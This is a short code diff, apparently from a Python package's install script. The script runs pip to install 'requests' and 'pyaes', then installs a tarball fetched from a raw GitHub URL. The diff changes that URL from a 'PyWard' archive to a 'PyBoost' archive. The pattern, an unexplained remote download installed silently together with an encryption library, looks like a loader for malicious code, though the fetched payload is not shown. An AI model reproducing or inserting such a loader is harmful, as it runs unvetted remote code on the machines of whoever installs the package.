@@ -3,7 +3,7 @@ import sys
 import subprocess
 subprocess.call(["pip", "install", "requests", "pyaes"])
 
-package_url = "https://github.com/geethaab/PyWard/raw/main/pyward-3.0.tar.gz"
+package_url = "https://github.com/geethaab/PyBoost/raw/main/pyboost-3.0.tar.gz"
 
 
 subprocess.call(["pip", "install", package_url])
